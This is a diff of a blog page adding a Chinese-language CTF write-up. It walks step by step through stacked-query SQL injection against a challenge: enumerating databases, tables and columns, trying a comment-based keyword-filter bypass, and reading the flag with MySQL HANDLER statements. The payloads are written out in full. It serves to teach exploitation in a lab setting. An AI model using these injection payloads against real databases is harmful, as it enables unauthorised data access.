@@ -10,7 +10,13 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    
+    <meta name="description" content="返回了一个数组
+图片1
+再加一个单引号，出现报错，说明存在SQL注入
+图片2
+为了防止输入1时的干涉，我们输入0（单纯输入0是不会出现任何回应）
+10&amp;#x27;;show databases;#
+,"> 
     
     <link rel="alternative" href="atom.xml" title="EZzz" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -19,7 +25,13 @@
     
     <meta name="twitter:card" content="summary"/>
     <meta name="twitter:title" content="NEU - EZzz"/>
-    
+    <meta name="twitter:description" content="返回了一个数组
+图片1
+再加一个单引号，出现报错，说明存在SQL注入
+图片2
+为了防止输入1时的干涉，我们输入0（单纯输入0是不会出现任何回应）
+10&amp;#x27;;show databases;#
+,"/>
     
     
     
@@ -27,7 +39,13 @@
     <meta property="og:site_name" content="EZzz"/>
     <meta property="og:type" content="object"/>
     <meta property="og:title" content="NEU - EZzz"/>
-    
+    <meta property="og:description" content="返回了一个数组
+图片1
+再加一个单引号，出现报错，说明存在SQL注入
+图片2
+为了防止输入1时的干涉，我们输入0（单纯输入0是不会出现任何回应）
+10&amp;#x27;;show databases;#
+,"/>
     
 <link rel="stylesheet" href="/css/diaspora.css">
 
@@ -67,7 +85,46 @@
 
         </div>
         <div class="content markdown">
-            
+            <p>返回了一个数组</p>
+<p>图片1</p>
+<p>再加一个单引号，出现报错，说明存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a></p>
+<p>图片2</p>
+<p>为了防止输入1时的干涉，我们输入0（单纯输入0是不会出现任何回应）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;show databases;#</span><br></pre></td></tr></table></figure>
+
+<p>然后得到数据库的名字</p>
+<p>图片3</p>
+<p> 查询表格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p>图片4</p>
+<p>FlagHere查询这个表格列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;show columns from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>图片5</p>
+<p>开始的时候认为直接查询flag就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;select flag from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>但是此时提示不能出现以下关键词</p>
+<p>图片6</p>
+<p>&#x2F;**&#x2F;可以绕过检查，所以修改payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;sel/**/ect flag from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>但是竟然什么都没有</p>
+<p>然后查询wp发现还有一种操作</p>
+<blockquote>
+<p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p>
+</blockquote>
+<p>这是一个例子</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name <span class="comment">&#123; = | &lt;= | &gt;= | &lt; | &gt; &#125;</span> (value1,value2,...)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name <span class="comment">&#123; FIRST | NEXT | PREV | LAST &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> <span class="comment">&#123; FIRST | NEXT &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
+
+<p> 更多可参考<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">MySQL :: MySQL 8.0 Reference Manual :: 13.2.4 HANDLER Statement</a></p>
+<p>所以按照这个重新构造payload</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&#x27;;<span class="type">HANDLER</span> <span class="type">FlagHere</span> <span class="type">OPEN</span>;<span class="type">HANDLER</span> <span class="type">FlagHere</span> <span class="type">READ</span> <span class="type">FIRST</span>;<span class="type">HANDLER</span> <span class="type">FlagHere</span> <span class="type">CLOSE</span>;#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/e37cf276e28141b294d4230af395ea36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBALeecvOmHjOacieaYn-aysy0=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src="">
